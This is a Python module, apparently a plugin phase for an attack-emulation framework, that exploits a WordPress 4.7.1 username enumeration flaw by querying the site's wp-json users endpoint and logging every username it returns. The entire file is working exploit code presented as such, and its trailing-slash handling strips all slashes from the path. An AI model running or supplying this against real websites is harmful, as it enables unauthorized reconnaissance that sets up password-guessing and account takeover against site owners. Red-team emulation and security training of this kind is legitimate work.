"""
    This module exploits a WordPress username enumeration vulnerability.
"""
from abstract_circadence_phase import AbstractCircadencePhase
import requests


class WordPressUserEnumeration(AbstractCircadencePhase):
    TrackerId = 'WordPressUserEnumeration'
    Subject = 'WordPress_version_4.7.1_username_enumeration_phase'
    Description =   """
                    The 'WordPressUserEnumeration' phase extracts
                    all usernames for a given WordPress site of
                    version 4.7.1 or less.
                    """
    
    required_input_parameters = {'path': None}
    output_parameters = {'users': None}

    def __init__(self, info):
        """
            Initialize the exploit

            @requires: C{info} is a dictionary with a
                I{'path'} key that is a string representing a
                web address.
        """
        AbstractCircadencePhase.__init__(self, info=info)
        assert 'path' in info

    def Setup(self):
        path = self.PhaseResult['path']

        if path.startswith("http://"):
            path = path.replace("http://", "")
        if path.endswith("/"):
            path = path.replace("/", "")

        self._path = path
        self._payload = "/index.php/wp-json/wp/v2/users/"
        self._header = {
            'Content-type': 'text/html',
            'charset':      'UTF-8'
        }
        return True

    def Run(self):
        """
            Execute the exploit
        """
        web_request = requests.get("http://" + self._path + self._payload, headers=self._header)

        if web_request.status_code != requests.codes.ok:
            raise Exception('Bad web request')

        else:
            json_user_data = web_request.json()
            users = list()

        for user in json_user_data:
            users.append(user['name'])

        self._progress = 99
        self.PhaseResult['users'] = users

        for identifier, username in enumerate(users):
            self.PhaseReporter.Info('user[{0}]= {1}'.format(identifier, username))

        self._progress = 100
        return True


def create(info):
    """
        Create instance of username enumeration object
        @return: instance of a WordPressUserEnumeration object
    """
    return WordPressUserEnumeration(info)
